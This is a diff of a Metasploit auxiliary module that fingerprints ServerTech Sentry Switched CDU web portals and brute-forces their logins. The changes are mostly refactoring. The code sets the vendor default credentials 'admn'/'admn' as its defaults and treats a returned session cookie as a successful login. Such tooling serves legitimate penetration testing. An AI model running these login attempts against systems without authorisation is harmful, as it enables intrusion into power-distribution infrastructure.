@@ -19,8 +19,9 @@ class Metasploit3 < Msf::Auxiliary
 		super(update_info(info,
 			'Name'           => 'Sentry Switched CDU Bruteforce Login Utility',
 			'Description'    => %{
-				This module scans for ServerTech's Sentry Switched CDU (Cabinet Power Distribution Unit) web login portals, and performs login brute force to identify valid credentials.
-Vendor site: www.servertech.com.
+				This module scans for ServerTech's Sentry Switched CDU (Cabinet Power
+				Distribution Unit) web login portals, and performs login brute force
+				to identify valid credentials.
 			},
 			'Author'         =>
 				[
@@ -31,20 +32,14 @@ Vendor site: www.servertech.com.
 
 		register_options(
 			[
-				Opt::RPORT(80),
 				OptString.new('USERNAME', [true, "A specific username to authenticate as, default 'admn'", "admn"]),
 				OptString.new('PASSWORD', [true, "A specific password to authenticate with, deault 'admn'", "admn"])
 			], self.class)
 	end
 
 	def run_host(ip)
-		unless check_conn?
-			print_error("#{rhost}:#{rport} - Connection failed, Aborting...")
-			return
-		end
-
 		unless is_app_sentry?
-			print_error("#{rhost}:#{rport} - Application does not appear to be Sentry Switched CDU. Module will not continue.")
+			print_error("#{rhost}:#{rport} - Sentry Switched CDU not found. Module will not continue.")
 			return
 		end
 
@@ -54,43 +49,31 @@ Vendor site: www.servertech.com.
 		end
 	end
 
-	def check_conn?
+	#
+	# What's the point of running this module if the app actually isn't Sentry
+	#
+	def is_app_sentry?
 		begin
 			res = send_request_cgi(
 			{
 				'uri'       => '/',
 				'method'    => 'GET'
 			})
-			print_good("#{rhost}:#{rport} - Server is responsive...")
-		rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError, ::Errno::EPIPE
-			return
+		rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError
+			return false
 		end
-	end
 
-	#
-	# What's the point of running this module if the app actually isn't Sentry
-	#
-
-	def is_app_sentry?
-			res = send_request_cgi(
-			{
-				'uri'       => '/',
-				'method'    => 'GET'
-			})
-
-			if (res and res.body.include?("Sentry Switched CDU"))
-				p_name = 'ServerTech Sentry Switched CDU'
-				print_good("#{rhost}:#{rport} - Running #{p_name}")
-				return true
-			else
-				return false
-			end
+		if (res and res.body.include?("Sentry Switched CDU"))
+			vprint_good("#{rhost}:#{rport} - Running ServerTech Sentry Switched CDU")
+			return true
+		else
+			return false
+		end
 	end
 
 	#
 	# Brute-force the login page
 	#
-
 	def do_login(user, pass)
 		vprint_status("#{rhost}:#{rport} - Trying username:#{user.inspect} with password:#{pass.inspect}")
 		begin
@@ -103,7 +86,6 @@ Vendor site: www.servertech.com.
 
 			if (res and res.headers['Set-Cookie'])
 				print_good("#{rhost}:#{rport} - SUCCESSFUL LOGIN - #{user.inspect}:#{pass.inspect}")
-
 
 				report_hash = {
 					:host   => rhost,
